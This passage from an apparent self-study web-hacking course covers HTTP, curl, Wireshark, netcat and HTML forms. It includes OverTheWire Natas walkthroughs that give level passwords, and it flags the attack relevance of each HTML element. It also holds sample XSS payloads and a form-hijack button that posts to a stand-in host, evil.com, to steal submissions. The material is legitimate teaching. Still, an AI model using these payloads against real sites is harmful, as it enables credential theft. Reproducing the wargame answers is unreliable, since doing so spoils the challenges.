  • TRACE: echo the request (used for debugging, often disabled).
  • CONNECT: establish a tunnel (for HTTPS proxies).

In web exploitation, you’ll use GET, POST, and often craft custom methods to trigger unexpected behavior.

docs.title: 4.3 HTTP Response Structure
docs.text:
HTTP/1.1 200 OK
Date: Mon, 12 May 2025 13:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>...
  1. Status line: HTTP-version status-code reason-phrase
  2. Headers
  3. Empty line
  4. Body

docs.title: 4.4 Status Codes
docs.text:
• 1xx Informational: 100 Continue, 101 Switching Protocols.
  • 2xx Success: 200 OK, 201 Created, 204 No Content.
  • 3xx Redirection: 301 Moved Permanently, 302 Found (temporary), 304 Not Modified.
  • 4xx Client Error: 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed.
  • 5xx Server Error: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable.

Understanding status codes helps you interpret scan results and exploit misconfigurations.

docs.title: Request headers:
docs.text:
• Host: specifies the domain name (since one IP can host multiple sites). Mandatory in HTTP/1.1.
  • User-Agent: identifies client software. Often spoofed.
  • Accept: media types the client can handle.
  • Cookie: sends stored cookies (for session management).
  • Authorization: credentials (Basic, Bearer, etc.).
  • Referer: the previous page, used for tracking and sometimes CSRF protection.
  • Content-Type: media type of the request body (e.g., application/x-www-form-urlencoded or multipart/form-data).
  • Content-Length: size of the body in bytes.

docs.title: Response headers:
docs.text:
• Server: software information (can be hidden or faked).
  • Set-Cookie: instructs the browser to store a cookie.
  • Location: used with 3xx redirects.
  • Cache-Control, Expires: caching directives.
  • Content-Type, Content-Length, Content-Encoding.
  • WWW-Authenticate: challenges for authentication.
  • Access-Control-Allow-Origin: CORS (Cross‑Origin Resource Sharing).

docs.title: 4.6 Cookies and Sessions
docs.text:
Because HTTP is stateless, servers need a way to track users. Cookies are small pieces of data stored by the browser and sent with every request to the domain that set them. A typical session cookie might be:

Set-Cookie: session=123abc; Path=/; HttpOnly; Secure
  • HttpOnly: prevents JavaScript from reading the cookie (mitigates some XSS).
  • Secure: only sent over HTTPS.
  • SameSite: controls cross‑site request behavior.

In web exploitation, stealing or manipulating cookies is a primary goal (session hijacking, XSS, CSRF).

docs.title: 4.7 HTTP Keep‑Alive and Pipelining
docs.text:
• Connection: keep-alive: allows multiple requests over the same TCP connection, reducing overhead. Default in HTTP/1.1.
  • Pipelining: sending multiple requests without waiting for each response (rarely used, often disabled).

docs.title: 4.8 URL Encoding
docs.text: URLs can only contain a subset of ASCII characters. Special characters are encoded as % followed by two hex digits, e.g., space → %20, < → %3C, > → %3E. In query strings, key=value pairs are separated by &. This encoding is crucial when crafting injection payloads.

docs.title: Part V – Tools: Inspecting HTTP with curl and Browser DevTools
5.1 curl – The Command‑Line HTTP Client
docs.text: curl is a Swiss Army knife for transferring data with URL syntax. It supports HTTP, HTTPS, FTP, and more.

docs.title: Basic Usage
docs.text:
curl http://example.com

Sends a GET request and prints the response body.

docs.title: Verbose Output
docs.text:
curl -v http://example.com

The -v (verbose) flag shows the request and response headers, plus TLS handshake details if HTTPS. This is how you see raw protocol interaction.

Example output:

*   Trying 93.184.216.34:80...
* Connected to example.com (93.184.216.34) port 80 (#0)
> GET / HTTP/1.1
> Host: example.com
> User-Agent: curl/7.81.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Age: 123456
< Cache-Control: max-age=604800
< Content-Type: text/html; charset=UTF-8
< Date: Mon, 12 May 2025 13:00:00 GMT
< Server: ECS (dcb/7F83)
< Content-Length: 1256
< Connection: keep-alive
<
<!doctype html>...

Lines starting with > are sent by the client; < are received from the server; * is curl informational.

docs.title: Common Options
docs.text:
• -I : fetch only headers (HEAD request).
  • -X METHOD : specify custom method (e.g., -X POST, -X PUT, -X DELETE).
  • -H "Header: value" : add custom header.
  • -d "data" : send POST data (automatically sets Content-Type to application/x-www-form-urlencoded).
  • --data-urlencode "key=value" : URL‑encode the data.
  • -b "cookiename=value" : send cookie.
  • -c cookiefile : store cookies to file (and -b cookiefile to read).
  • -L : follow redirects.
  • -o outputfile : write output to file.
  • -k or --insecure : ignore TLS certificate errors (useful for testing).
  • --resolve host:port:ip : override DNS resolution (force a specific IP).

Practice: Run curl -v http://example.com and identify every part of the request and response.

Craft a POST request:

curl -v -X POST http://httpbin.org/post -d "username=admin&password=12345"

Observe the Content-Type and body. Then try adding a custom header:

curl -v -H "X-Custom: test123" http://httpbin.org/get

Cookie handling:

curl -v -b "session=abcdef" http://httpbin.org/cookies

docs.title: Raw HTTP over Netcat (for understanding)
docs.text:
You can even speak HTTP with nc:

nc example.com 80
GET / HTTP/1.1
Host: example.com
(press Enter twice)

But curl -v is more practical. This milestone request is to craft a raw request, which we'll do at the end.

docs.title: 5.2 Wireshark Capture of HTTP and DNS Traffic
docs.text:
Wireshark is a graphical packet analyser. We’ll capture live traffic, filter, and inspect.

  1. Start Wireshark on your host or VM.
  2. Select the network interface that carries your internet traffic (e.g., enp0s3, wlan0, or any).
  3. Begin capture.
  4. Generate some traffic:
  5. In a terminal, curl http://example.com and dig google.com.
  6. Stop capture.
  7. Use display filters:
  8. http : show only HTTP packets.
  9. dns : show only DNS.
  10. tcp.port == 80 : TCP traffic on port 80.
  11. ip.addr == 93.184.216.34 : traffic to/from that IP.
  12. Click on a packet and expand the protocol layers in the middle pane. For HTTP, you’ll see the request line, headers, and body. For DNS, you’ll see the query and response details.
  13. Follow TCP stream: right‑click on an HTTP packet → Follow → TCP Stream. This reassembles the entire conversation (request + response) into a readable window.

Exercise: capture the dig example.com query in Wireshark, identify the DNS query packet (UDP, port 53) and response. Look at the Question and Answer sections.

Exercise: capture curl -v http://httpbin.org/get?search=test, then locate the HTTP GET request, examine the query string. Then look at the response headers and code.

Note: HTTPS (TLS) encrypts the HTTP content, so you’ll only see TLS handshake packets in Wireshark. You can’t see the plain HTTP headers without decrypting the TLS session (which requires the private key or SSLKEYLOGFILE trick). For now, we work with plain HTTP to see the raw data.

docs.title: Part VI – Practical Lab: Using Browser Developer Tools
6.1 Opening DevTools
docs.text:
In Firefox or Chrome, press F12 or Ctrl+Shift+I. The Network tab is the most important for web exploitation.

  1. Navigate to http://example.com (use HTTP, not HTTPS, for this learning).
  2. Open DevTools, go to Network tab.
  3. Refresh the page (F5).
  4. You’ll see the entry for the main document (e.g., example.com). Click on it.
  5. On the right, you’ll see Headers section, with Request Headers, Response Headers, etc. This is the exact same information you saw in curl -v.
  6. The Response tab shows the raw HTML.
  7. The Cookies tab shows cookies set by the server.

docs.title: 6.2 Viewing and Modifying the DOM
docs.text:
In the Elements (or Inspector) tab, you see the live HTML. You can edit any attribute or text—changes are only client‑side, but this is how you test for XSS vulnerabilities locally. You can also view hidden form fields and comments.

This directly prepares you for Natas level 0, where the password is in the HTML source.

docs.title: Part VII – OverTheWire Natas: Web Application Security Wargame
docs.text: Natas teaches server‑side web security. It’s similar to Bandit but browser‑based. Each level is accessed via a URL like http://natasX.natas.labs.overthewire.org, where X is the level number. The password for the next level is usually retrieved from the web page.

docs.title: Natas Level 0 → Level 1
docs.text:
URL: http://natas0.natas.labs.overthewire.org Username: natas0 Password: natas0

Goal: Find the password for natas1.

Solution: 1. Open the URL in your browser and log in with the credentials. 2. You see a page with a message: “You can find the password for the next level on this page.” 3. Right‑click and select View Page Source (or Ctrl+U). Alternatively, in DevTools, inspect the element. 4. Scrolling down, you’ll see a comment: ```

``` 5. That string is the password for natas1.

Takeaway: Always check the HTML source. Comments, hidden inputs, and inline scripts may leak sensitive data.

docs.title: Natas Level 1 → Level 2
docs.text:
URL: http://natas1.natas.labs.overthewire.org Username: natas1 Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto (the one from previous)

Goal: Same as before, but now right‑click is blocked.

Solution: - You can still view page source using Ctrl+U (or Cmd+U on Mac), or via the browser menu (View → Page Source). - Alternatively, use DevTools: Elements tab and then find the comment. - The source contains a comment with the password for natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi.

Takeaway: Never rely on client‑side restrictions for security. A blocked right‑click is trivial to bypass. Always look at the real source code.

Record these passwords for future use. You’ll continue Natas in later weeks as we introduce more advanced concepts (HTTP headers, cookies, etc.).

docs.title: Part VIII – Milestone: Craft a Raw HTTP Request with curl and Observe All Headers
docs.text: Now that you understand HTTP deeply, it’s time to manually craft a request, inspect every header, and understand the server’s response. This is the Week 8 milestone.

docs.title: 8.1 Step‑by‑Step
docs.text:
1. Choose a target. Let’s use http://httpbin.org/headers — this service echoes back the request headers it receives, which is perfect for seeing what your client sends.

2. Run curl with verbose and custom headers:

curl -v -H "X-Custom-Header: HelloWorld" -H "Accept-Language: en" http://httpbin.org/headers

3. Observe the output. You’ll see the request headers (>) and response headers (<). Identify each line: - > GET /headers HTTP/1.1 - > Host: httpbin.org - > User-Agent: curl/... - > Accept: */* - > X-Custom-Header: HelloWorld - > Accept-Language: en

Then the response status line and headers. The body will be a JSON showing the headers httpbin received, including your custom one.

4. Now craft a POST request with a body:

curl -v -X POST http://httpbin.org/post -H "Content-Type: application/x-www-form-urlencoded" -d "name=Ada&age=30"

Notice how Content-Type and Content-Length are automatically set when you use -d. Observe the request body and the echoed response.

5. Try an OPTIONS request:

curl -v -X OPTIONS http://httpbin.org/

Look at the Allow header in the response to see which methods are supported.

6. Try following redirects:

curl -v -L http://httpbin.org/redirect/2

Note the Location header and the 301 or 302 codes. -L makes curl follow them.

7. Perform a GET with no Host header (malformed for HTTP/1.1):

curl -v --http1.1 http://httpbin.org/ --header "Host:"

This may cause a 400 Bad Request on some servers because Host is mandatory.

8. Examine raw request using nc (netcat) — a true milestone for raw understanding:

nc httpbin.org 80

Then type precisely (after connecting):

GET /get?name=test HTTP/1.1
Host: httpbin.org
Connection: close

Press Enter after the blank line. You should receive the raw HTTP response. This demonstrates that you can speak HTTP manually, essential for crafting exploits.

9. Document what you sent and received. Open a notes file week8_milestone.md and write down: - The structure of an HTTP request (request line, headers, blank line, body). - The structure of an HTTP response (status line, headers, blank line, body). - A list of at least 10 standard request headers and their purpose. - The meaning of status codes 200, 301, 302, 400, 401, 403, 404, 500, 502. - A sample curl command with -v and its output annotated.

docs.title: 8.2 Extension: Set Up a Local Web Server and Interact
docs.text:
For even deeper understanding, start a simple Python HTTP server on your VM:

cd /tmp
mkdir testweb
echo "Hello hacker" > index.html
python3 -m http.server 8080

Now access it from another terminal:

curl -v http://localhost:8080/index.html

Play with different methods, headers, and observe the server’s response. Kill the server with Ctrl+C when done.

docs.title: Part IX – Week 8 Verification and Self‑Test
9.1 Knowledge Check
docs.text:
1. Explain the difference between TCP and UDP in terms of reliability and typical protocol examples.
  2. What is the HPACK? Wait, no, what is the Host header and why is it required in HTTP/1.1?
  3. How does a recursive DNS resolver find the IP of www.example.com step by step?
  4. What are the four messages of DHCP (DORA)?
  5. List five HTTP methods and their typical uses.
  6. What does curl -v show that curl alone does not?
  7. How do you view page source when right‑click is blocked?
  8. In Wireshark, what filter displays only DNS traffic?

docs.title: 9.2 Practical Test
docs.text:
• From your VM, use dig to find the IP address of overthewire.org and its mail server.
  • Use curl -v to send a POST request to http://httpbin.org/post with a custom header X-Student: YourName.
  • Start a packet capture, perform a curl http://example.com, stop capture, and locate the HTTP GET request and response in Wireshark. Follow the TCP stream.
  • Log into Natas level 1 using the password from level 0, retrieve the password for level 2, and save it.
  • Using nc, send an HTTP request to httpbin.org on port 80 and retrieve a response.

If you can do all of the above, you have mastered the application‑layer protocols required for web exploitation.

docs.title: Part X – Cheat Sheet for Week 8
docs.text: Command / Concept Explanation dig example.com DNS A record query dig example.com MX Mail server query dig @8.8.8.8 example.com Query specific resolver dig +short example.com Short output nslookup example.com Interactive DNS lookup curl -v http://example.com Verbose HTTP traffic (headers) curl -X POST -d "data" URL POST request with data curl -H "Header: val" URL Add custom request header curl -I URL Fetch headers only curl -L URL Follow redirects curl -b cookie -c cookie Use/store cookies curl -k URL Ignore TLS errors nc host 80 then type HTTP Raw HTTP interaction Wireshark filter: http Show HTTP packets Wireshark filter: dns Show DNS packets Developer Tools → Network tab View all HTTP requests/responses View page source Ctrl+U Override right‑click block HTTP Status Codes 200 OK, 301/302 redirect, 404 not found, 500 internal error HTTP Request structure Method path version, headers, blank line, body HTTP Response structure Version status reason, headers, blank line, body TCP vs UDP TCP: reliable stream, handshake; UDP: datagram, no guarantees DHCP DORA Discover, Offer, Request, Acknowledge

docs.title: Part XI – What’s Next?
docs.text:
You’ve now got the foundation. In Week 9 you’ll build on this to create real web content with HTML and forms, setting the stage for understanding injection attacks. You’ll learn to read and write HTML, and you’ll start building your own pages—so that when we later teach you to break them, you know exactly what’s happening behind the curtain.

Before moving on, spend a day playing with curl and Wireshark until the HTTP request/response cycle feels like second nature. The web is just a conversation; you now understand the language.

Congratulations—you can now speak HTTP fluently and you’ve taken the first step into the web application hacking wargame. Your reconnaissance toolkit is growing stronger every week.

docs.title: Week 9: HTML & Document Structure – Building the Web’s Skeleton
docs.text: Welcome to Week 9! You’ve learned how the web’s plumbing works (HTTP, DNS, TCP/IP). Now you’ll learn the language that web pages are written in: HTML. You’ll build a multi‑page personal portfolio site from scratch, create functional forms, validate your code with industry standards, and understand exactly how every element you see in a browser is represented as text. By the end of this week, you’ll be able to read and write HTML fluently – a prerequisite for understanding XSS, CSRF tokens, form‑based injection, and hidden content leakage.

docs.title: Part I – Why HTML Matters for Web Exploitation
docs.text:
The web attacks you’ll perform later – SQL injection, XSS, CSRF, parameter tampering – all occur because user input is mishandled in HTML documents or server‑side parsing of HTTP parameters. If you don’t understand HTML, you can’t: - Identify where input ends up in the page (reflected XSS). - Craft payloads that break out of HTML attributes. - Understand how forms are built so that you can bypass client‑side validation. - Recognise hidden fields that may contain secrets or tokens.

HTML is the blueprint. You’re learning to read the blueprint before you learn to break the building.

docs.title: Part II – Core Concepts: Tags, Elements, Attributes, and the DOM
2.1 What Is HTML?
docs.text: HTML (HyperText Markup Language) is not a programming language; it’s a markup language that defines the structure and content of a web page. A browser reads an HTML document and renders it visually.

docs.title: 2.2 Elements and Tags
docs.text:
An HTML document is composed of elements. An element is defined by a start tag, some content, and an end tag:

<p>This is a paragraph.</p>
  • Start tag: <p>
  • Content: This is a paragraph.
  • End tag: </p>

Some elements have no content and are called void elements; they are self‑closing, e.g., <img src="photo.jpg"> or <br> (line break) or <input>.

Nesting: Elements can contain other elements.

<p>This is <strong>bold</strong> text.</p>

It is crucial to properly close tags in the correct order. Improper nesting can break a page’s layout and cause browser parsing quirks – hackers often exploit improper filtering by injecting malformed tags.

docs.title: 2.3 Attributes
docs.text:
Attributes provide additional information about an element. They are placed inside the start tag and usually come in name="value" pairs.

<a href="https://example.com">Visit Example</a>
<img src="logo.png" alt="Company Logo" width="200" height="100">

Common attributes: id, class, style, src, href, alt, title, name (important for form data), value (default value for form inputs), required, disabled.

HTML5 Boolean attributes can be written without a value: <input type="checkbox" checked> means the same as checked="checked". Knowing this helps when injecting minimal payloads.

docs.title: 2.4 Document Object Model (DOM)
docs.text: When the browser parses HTML, it builds a tree structure in memory called the DOM (Document Object Model). JavaScript can manipulate this tree, changing the page on the fly. As a hacker, you’ll use the DOM inspector to see the final state after scripts run, not just the raw source.

docs.title: Part III – The Basic HTML5 Document Template
docs.text:
Every HTML5 document starts with a standard skeleton:

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Title</title>
</head>
<body>
    <!-- Visible content goes here -->
</body>
</html>

Explanation: - <!DOCTYPE html>: declares this as an HTML5 document, preventing “quirks mode”. - <html>: root element. lang attribute helps accessibility and search engines. - <head>: contains metadata (not visible to the user). - <meta charset="UTF-8">: ensures proper character encoding (essential for avoiding garbled characters, and sometimes encoding‑based attacks). - <meta name="viewport">: for responsive design. - <title>: text in the browser tab. - <body>: all visible content (text, images, forms, etc.). - <!-- -->: an HTML comment. Always check comments in source code – developers sometimes leave passwords, notes, or clues (as you saw in Natas).

docs.title: Part IV – Common HTML5 Elements (With Attack Relevance)
4.1 Headings and Paragraphs
docs.text:
<h1>Main Heading</h1>
<h2>Subheading</h2>
<p>Paragraph with <em>emphasized</em> and <strong>strong</strong> text.</p>

Attack note: <script> tags inside these can execute JavaScript if the backend echoes user input without sanitisation (stored XSS).

docs.title: 4.2 Links (<a>)
docs.text:
<a href="https://example.com" target="_blank" rel="noopener">Visit Example</a>
  • href: the URL. If an attacker can control this, they can inject javascript:alert(1) for XSS, or javascript: pseudo‑protocol to execute code. Even a relative path like href="javascript:evil()" works.
  • target="_blank" without rel="noopener noreferrer" can be a security issue (tabnabbing). We’ll cover this later in phishing attacks.

docs.title: 4.3 Images (<img>)
docs.text:
<img src="profile.jpg" alt="Profile photo" width="300">
  • src: URL of the image. An attacker who controls this can use " onerror="alert(1) if they also break out of the attribute with a quote – a classic XSS vector: <img src=x onerror=alert(1)> – even though src is invalid, the onerror event fires.
  • alt: text if image can’t load; also used by screen readers.

docs.title: 4.4 Lists
docs.text:
<ul>
    <li>Unordered item</li>
</ul>
<ol>
    <li>Ordered item 1</li>
    <li>Ordered item 2</li>
</ol>

Useful for navigation menus (and often tested for HTML injection into lists).

docs.title: 4.5 Tables (basic)
docs.text:
<table border="1">
    <tr><th>Name</th><th>Age</th></tr>
    <tr><td>Alice</td><td>30</td></tr>
</table>

Tables are less critical for exploitation but occasional for data display.

docs.title: 4.6 Divisions and Spans (Generic Containers)
docs.text:
• <div>: block‑level container, used for layout.
  • <span>: inline container, used for styling parts of text. These have no semantic meaning but are essential for CSS styling and JavaScript manipulation.

docs.title: 4.7 Semantic HTML5 Elements (Better Structure)
docs.text:
Element Purpose <header> Introductory content or navigation <nav> Navigation links <main> Main content of the document (only one) <section> Thematic grouping of content <article> Self‑contained composition (blog post) <aside> Sidebar content <footer> Footer information

These improve accessibility and make page parsing easier. As a pentester, recognising <nav> and <footer> can help you identify where login forms or important links are located.

docs.title: Part V – Forms: The Doors to the Server
docs.text: Forms are where the action is: they send user data to the server, and they are the primary vector for SQLi, XSS, CSRF, and countless other attacks.

docs.title: 5.1 The <form> Element
docs.text:
<form action="/submit" method="POST">
    <!-- inputs inside -->
    <button type="submit">Send</button>
</form>

Attributes: - action: the URL where the form data is sent (relative or absolute). If empty, it submits to the same page. - method: HTTP method – GET (data appended to URL, visible in browser history and server logs) or POST (data in request body, not visible in URL). Always check: a login form using GET would send passwords in the URL! - enctype: for file uploads use multipart/form-data. - target: if _blank, opens in a new tab. - autocomplete: whether browser can auto‑fill (security vs. usability).

Attack perspective: You can modify the action attribute client‑side (DOM manipulation) to redirect the form to your own server, a classic phishing technique. Also, you can change method to see if the server accepts a different method.

docs.title: 5.2 Input Fields
docs.text:
The <input> element is the most versatile, controlled by the type attribute. Each type provides different validation and UI on modern browsers.

Common type values: | Type | Description | Attack notes | |------|-------------|--------------| | text | Single line text | default, can inject HTML/JS if not escaped | | password | Masked text (dots) | Only visual; the actual value is still sent to server | | email | Email validation | Can be bypassed – server must validate | | number | Numeric input | Can inject if validation weak | | checkbox | On/off toggle | Value sent only if checked | | radio | Multiple‑choice single select | Grouped by name | | file | File upload | Test for unrestricted uploads! | | hidden | Not visible to user | Developers often put sensitive tokens here – always inspect | | submit | Button to submit form | Can be manipulated via JS | | button | Generic button (usually JS‑driven) | Often used for custom actions |

Example:

<input type="text" name="username" placeholder="Enter username" required>
<input type="password" name="password" placeholder="Password" minlength="8">
<input type="email" name="email" value="test@example.com">
<input type="checkbox" name="remember" checked>
<input type="hidden" name="csrf_token" value="d41d8cd98f00b204e9800998ecf8427e">

Critical: The name attribute is the key used when sending the form data. It’s the parameter name in the query string or POST body. So a field <input name="user"> with value Alice sends user=Alice. That’s what you’ll fuzz and inject.

Attack relevance: - hidden fields: check for hard‑coded values, tokens, prices (e‑commerce), user IDs. You can modify them in the DOM and submit altered values, possibly leading to privilege escalation or price manipulation. - required and minlength are client‑side only! Always re‑test on server. Use Burp Suite to strip them. - maxlength client‑side limit can be bypassed.

docs.title: 5.3 Labels, Textareas, Select Menus, Fieldset
docs.text:
<label for="email">Email:</label>
<input type="email" id="email" name="email">

label improves accessibility; for points to the id of the input.

Textarea – for multi‑line text:

<textarea name="comment" rows="4" cols="50">Default text</textarea>

Select dropdown:

<select name="country">
    <option value="US">United States</option>
    <option value="CA" selected>Canada</option>
</select>

The selected attribute pre‑selects; you can change it. The value is what’s sent, not the display text. Attackers can craft arbitrary values if the server blindly trusts them.

Fieldset and Legend:

<fieldset>
    <legend>Personal Information</legend>
    <!-- inputs here -->
</fieldset>

Groups form sections visually.

docs.title: 5.4 Buttons
docs.text:
• <button type="submit">Send</button> – submits the form.
  • <button type="reset">Reset</button> – clears all inputs.
  • <button type="button">Click me</button> – no default action, usually tied to JavaScript.

Attack trick: If you can inject HTML into a page, injecting a <button> with formaction attribute pointing to your own server could hijack a form’s submission target: <button formaction="https://evil.com/steal" formmethod="POST">Click</button>.

docs.title: 5.5 GET vs POST and Data Encoding
docs.text:
When the form uses method="GET", the data is appended to the URL as ?name1=value1&name2=value2. Example:

http://example.com/search?q=hello&page=2

For method="POST", the data is sent in the request body, with content type application/x-www-form-urlencoded (default) unless enctype is set to multipart/form-data (for file uploads). The format is the same key=value&key=value but URL‑encoded.

As a hacker, you’ll often convert between GET and POST: sometimes a server only checks one method. Use curl or Burp to change the method and see if it works.

docs.title: Part VI – Practical: Build Your Personal Portfolio Website
docs.text: Now you’ll build a multi‑page portfolio site from scratch, demonstrating all the above. Create a folder ~/portfolio and inside it create three HTML files and a simple stylesheet (CSS not needed but we’ll add a few inline styles for layout). This will be your milestone.

docs.title: 6.1 File Structure
docs.text:
portfolio/
├── index.html
├── about.html
├── contact.html
└── style.css (optional minimal)

docs.title: 6.2 index.html – Home Page
docs.text:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Portfolio - Home</title>
    <style>
        body { font-family: sans-serif; margin: 2em; }
        nav a { margin-right: 1em; text-decoration: none; color: blue; }
    </style>
</head>
<body>
    <header>
        <h1>Jane Hacker</h1>
        <p>Cybersecurity Enthusiast & Developer</p>
    </header>
    <nav>
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
    </nav>
    <main>
        <h2>Welcome</h2>
        <p>This is my personal website where I showcase my journey into web exploitation and secure coding.</p>
        <h3>Recent Projects</h3>
        <ul>
            <li>Bandit Challenges completed up to Level 20</li>
            <li>Python Log Parser</li>
            <li>Cryptopals Set 1</li>
        </ul>
    </main>
    <footer>
        <p>© 2025 Jane Hacker</p>
    </footer>
</body>
</html>

docs.title: 6.3 about.html – About Page
docs.text:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>About Me</title>
</head>
<body>
    <nav>
        <a href="index.html">Home</a> |
        <a href="about.html">About</a> |
        <a href="contact.html">Contact</a>
    </nav>
    <h1>About Me</h1>
    <p>I'm learning HTML, networking, and Python to become a penetration tester. This portfolio is part of my Week 9 milestone.</p>
    <h2>Skills</h2>
    <table border="1">
        <tr><th>Skill</th><th>Level</th></tr>
        <tr><td>Linux CLI</td><td>Advanced</td></tr>
        <tr><td>Python</td><td>Intermediate</td></tr>
        <tr><td>HTML</td><td>Beginner</td></tr>
    </table>
</body>
</html>

docs.title: 6.4 contact.html – Contact Page with Form
docs.text:
This page will contain a form that you can later use to test injection. For now, it’s a standard contact form.

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Contact Me</title>
</head>
<body>
    <nav>
        <a href="index.html">Home</a> |
        <a href="about.html">About</a> |
        <a href="contact.html">Contact</a>
    </nav>
    <h1>Contact Form</h1>
    <p>Please leave a message. (This form currently does nothing, but will later be connected to a server.)</p>
    <form action="contact.html" method="GET">
        <fieldset>
            <legend>Your Details</legend>
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" placeholder="Your name" required><br><br>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" placeholder="you@example.com" required><br><br>
        </fieldset>
        <fieldset>
            <legend>Your Message</legend>
            <label for="subject">Subject:</label>
            <select name="subject" id="subject">
                <option value="general">General Inquiry</option>
                <option value="bug">Bug Report</option>
                <option value="suggestion">Suggestion</option>
            </select><br><br>
            <label for="message">Message:</label><br>
            <textarea id="message" name="message" rows="5" cols="40" placeholder="Type your message here..."></textarea><br><br>
            <input type="checkbox" id="subscribe" name="subscribe" value="yes" checked>
            <label for="subscribe">Subscribe to newsletter</label>
        </fieldset>
        <br>
        <input type="submit" value="Send Message">
        <input type="reset" value="Clear Form">
    </form>
</body>
</html>

docs.title: 6.5 Styling (CSS – minimal)
docs.text: Create a style.css (or embed in a <style> block) to make it visually pleasant, but CSS is not the focus. The above examples already include a tiny inline style for the homepage. You can add more as you wish.

docs.title: 6.6 Testing Locally
docs.text:
Start the built‑in Python HTTP server in the ~/portfolio directory:

cd ~/portfolio
python3 -m http.server 8000

Open your browser and go to http://localhost:8000. You should see the homepage. Click links to navigate. Fill out the contact form and hit “Send Message”. Since the form uses method="GET", you’ll see the submitted data as query parameters in the URL: ?name=Jane&email=jane%40example.com&subject=general&message=Hello&subscribe=yes.

Observe: The URL contains the data! This is why you never send passwords via GET. The same is true for sensitive data – it appears in browser history and server logs.

Test Form Submission: Enter ?param=value directly in the URL to see if the page echoes it (no echo here, but in future weeks you’ll see reflected XSS).

docs.title: 6.7 Validate Your HTML with W3C Validator
docs.text: Visit https://validator.w3.org/#validate_by_upload. Upload your index.html file or paste the code directly. Fix any errors or warnings displayed. Aim for zero errors. This ensures your HTML is standards‑compliant, which is a good habit and helps avoid browser‑specific quirks that might interfere with exploit testing.

docs.title: 6.8 Adding a Hidden Field for Future Practice
docs.text:
For curiosity, add a hidden field to the contact form:

<input type="hidden" name="vip_token" value="1234567890abcdef">

This simulates a secret token. In future labs, you’ll intercept requests with Burp Suite and discover that you can modify this value before it reaches the server. For now, just note that it’s part of the source.

docs.title: Part VII – The Finer Points of HTML for Exploitation
7.1 Comments and Source Inspection
docs.text: Always inspect page source (Ctrl+U) – not just what DevTools Elements panel shows (which may have been modified by JavaScript). Comments like <!-- TODO: remove before production --> or <!-- password: admin123 --> are gold. Natas level 0 taught that lesson.

docs.title: 7.2 IFrames and Script Sources
docs.text: You’ll see <iframe src="..."> to embed other pages. Clickjacking attacks use iframes. Script tags <script src="external.js"> load JavaScript. As a defender, you use Content-Security-Policy to control which scripts can run; as an attacker, you look for missing CSP to inject scripts.

docs.title: 7.3 Character Escaping
docs.text:
Certain characters such as <, >, & must be escaped in HTML using entities: - < for < - > for > - & for & - " for " - ' for ' (hex escape)

If a web application fails to escape user input, those characters pass through and are interpreted as HTML tags, leading to XSS. For example, a search field that echoes your input without escaping allows <script>alert('XSS')</script> to execute. Conversely, if you see these entities in the source, the app is at least attempting to protect against XSS.

docs.title: 7.4 Data URIs and Base64
docs.text: HTML allows data: URIs in src attributes, e.g., <img src="data:image/png;base64,...">. XSS payloads often use data:text/html;base64,... to embed malicious HTML.

docs.title: Part VIII – Milestone Verification
docs.text:
By the end of this week, you must:

  1. Build a multi‑page website (at least three pages) with:
  2. Consistent navigation (internal links).
  3. A table or list.
  4. Images (can be placeholders from https://via.placeholder.com).
  5. A form with at least five different input types, including text, password, checkbox/radio, dropdown, and textarea. Also include a hidden field.
  6. Validate each page using the W3C Validator and fix all errors (except warnings about missing lang if you already included it).
  7. Serve the site locally using Python’s HTTP server and navigate it using a browser.
  8. Inspect the network tab in DevTools when submitting the form; see the GET parameters.
  9. Answer these questions in your notes:
  10. What does the name attribute on an <input> element control?
  11. How does GET differ from POST in form submission? Which is safer for passwords?
  12. What is a hidden field and why is it insecure to rely on it for sensitive data?
  13. If a website doesn’t escape < and > characters and echoes user input, what attack could happen?
  14. How do you view the raw HTML source of a page when right‑click is disabled?
  15. Where do HTML comments appear and why should you inspect them during a pentest?

If you can do all of the above, you own the core of HTML. Next week we’ll add CSS to make the portfolio look professional and learn how layout can hint at hidden admin panels. But for now, stand proud: you’ve written your first pages that will later become your test targets.

docs.title: Part IX – Cheat Sheet for Week 9
docs.text: Concept Example / Notes HTML5 template <!DOCTYPE html><html lang="en"><head>... Heading <h1>...</h1> to <h6> Paragraph <p>text</p> Link <a href="url">text</a> Image <img src="url" alt="desc"> List (unordered) <ul><li>item</li></ul> Ordered list <ol><li>item</li></ol> Table <table><tr><th>Head</th></tr><tr><td>Data</td></tr></table> Form <form action="url" method="GET/POST">...</form> Input <input type="text" name="key"> Password input <input type="password" name="pass"> Checkbox <input type="checkbox" name="opt" value="on"> Radio <input type="radio" name="group" value="val"> Textarea <textarea name="msg"></textarea> Select dropdown <select name="sel"><option value="v">Label</option></select> Hidden field <input type="hidden" name="token" value="secret"> Submit button <input type="submit" value="Send"> Comment <!-- comment --> View source Ctrl+U (Firefox/Chrome) W3C Validator https://validator.w3.org/ Local server python3 -m http.server 8000

docs.title: Part X – What’s Next?
docs.text:
In Week 10, you’ll transform your bare‑bones portfolio using CSS – learning selectors, the box model, flexbox/grid, and responsive design. You’ll create a dark/light mode toggle using CSS and a tiny bit of JavaScript, and you’ll appreciate how styling can reveal or hide elements from casual view. That foundation will later help you bypass client‑side UI restrictions and understand visible vs. hidden content in attacks.

But first, spend a few hours adding more content to your portfolio, trying every HTML5 element you haven’t yet used, and deliberately breaking the page (remove a closing tag, misspell an attribute) to see how gracefully the browser recovers. A hacker must know not only how things work, but how they fail.

Your portfolio is now a living lab. Keep it; you’ll attack it soon.

docs.title: Week 10: CSS & Layout – Giving Your Web Pages Style, Structure, and a Dark Side
docs.text:
